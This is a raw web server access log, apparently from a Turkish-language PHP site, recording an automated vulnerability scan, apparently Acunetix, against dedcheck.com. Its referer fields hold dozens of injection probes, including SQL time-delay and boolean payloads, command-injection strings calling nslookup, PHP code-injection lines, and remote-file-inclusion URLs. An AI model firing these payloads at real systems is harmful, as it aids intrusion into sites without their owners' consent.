IP: ::1 - TARIH: 25.11.2021 23:35:38 - BROWSER:  - REFERANS: http://localhost:8080/index.php 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:56 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:57 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:57 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:57 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:57 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:19:57 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: 1 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: 1 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: yE55U8Rq 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: -1 OR 2+735-735-1=0+0+0+1 -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: -1 OR 2+659-659-1=0+0+0+1 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: -1' OR 2+252-252-1=0+0+0+1 -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: -1' OR 2+322-322-1=0+0+0+1 or 'iol1fuBr'=' 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: -1" OR 2+208-208-1=0+0+0+1 -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: (select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'"+(select(0)from(select(sleep(9)))v)+"*/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: -1; waitfor delay '0:0:9' -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: set|set&set 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: -1); waitfor delay '0:0:9' -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: $(nslookup sS6bQA5J) 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: &nslookup qF5xSNsE&'\"`0&nslookup qF5xSNsE&`' 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:16 - BROWSER:  - REFERANS: 1 waitfor delay '0:0:3' -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: hwwsbDep'; waitfor delay '0:0:3' -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: -1;select pg_sleep(6); -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: ${9999551+10000019} 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: -1);select pg_sleep(6); -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: 1some_inexistent_file_with_long_name%00.jpg 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: 12345'"\'\");|]*%00{%0d%0a<%00>%bf%27'ðŸ’© 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: -1));select pg_sleep(6); -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: ) 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: Http://testasp.vulnweb.com/t/fit.txt 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: YL65m6FD';select pg_sleep(9); -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: !(()&&!|*|*| 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: http://testasp.vulnweb.com/t/fit.txt%3F.jpg 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: ^(#$!@#$)(()))****** 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: 8NZEUlT0');select pg_sleep(9); -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: testasp.vulnweb.com 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: d28TUkY9'));select pg_sleep(3); -- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: ;print(md5(acunetix_wvs_security_test)); 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: ';print(md5(acunetix_wvs_security_test));$a=' 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: ";print(md5(acunetix_wvs_security_test));$a=" 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: http://testasp.vulnweb.com/t/xss.html?%00.jpg 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: ${@print(md5(acunetix_wvs_security_test))} 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:17 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: ${@print(md5(acunetix_wvs_security_test))}\ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: http://hitsBDmIF9LT2.bxss.me/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:18 - BROWSER:  - REFERANS: ))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:26 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:26 - BROWSER:  - REFERANS: '" 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:26 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:26 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:26 - BROWSER:  - REFERANS: 1'" 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:26 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:26 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: <!-- 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: \ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: 1 À§À¢ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: @@GjGs4 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: JyI= 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: ¿'¿" 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: ð''ð"" 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: (select convert(int,CHAR(65))) 
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS:  
IP: 20.199.96.245 - TARIH: 27.11.2021 17:21:27 - BROWSER:  - REFERANS: https://dedcheck.com:443/ 
